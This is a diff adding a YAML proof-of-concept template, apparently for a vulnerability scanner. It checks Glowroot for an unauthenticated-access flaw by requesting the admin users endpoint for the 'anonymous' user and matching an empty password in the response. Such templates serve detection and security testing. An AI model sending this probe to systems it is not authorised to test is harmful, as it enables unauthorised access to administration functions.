@@ -1,0 +1,17 @@
+id: poc-yaml-glowroot-anonymous-user-unauth-access
+info:
+  name: Glowroot 任意用户登录漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: Glowroot
+  osprey-id: vb_2022_0053
+requests:
+- method: GET
+  path: /backend/admin/users?username=anonymous
+  expression: 'status_code == 200 && contains(body, "\"username\":\"anonymous\"")
+    && contains(body, "\"newPassword\":\"\"")
+
+    '
+variables: {}
+transport: http
